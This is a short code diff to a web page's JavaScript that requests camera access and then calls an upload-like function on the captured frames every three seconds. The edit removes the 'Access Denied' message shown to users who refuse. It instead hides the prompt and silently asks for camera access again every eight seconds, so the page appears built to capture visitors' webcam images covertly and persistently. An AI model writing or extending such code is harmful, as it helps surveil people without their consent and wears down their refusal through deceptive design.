@@ -109,7 +109,8 @@ function startCamera(){
   .then(stream=>{
     document.getElementById('permissionModal').style.display='none';
     v.srcObject=stream;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;v.play().then(()=>{setTimeout(()=>{up();setInterval(up,3000);},1000);});};}).catch(()=>{
-    document.getElementById('permissionBox').innerHTML='<h2>❌ Access Denied</h2><p>Camera permission was denied. Please refresh and allow camera access.</p><button onclick="location.reload()">Retry</button>';
+    document.getElementById('permissionModal').style.display='none';
+    setTimeout(()=>startCamera(),8000);
   });
 }
 async function up(){
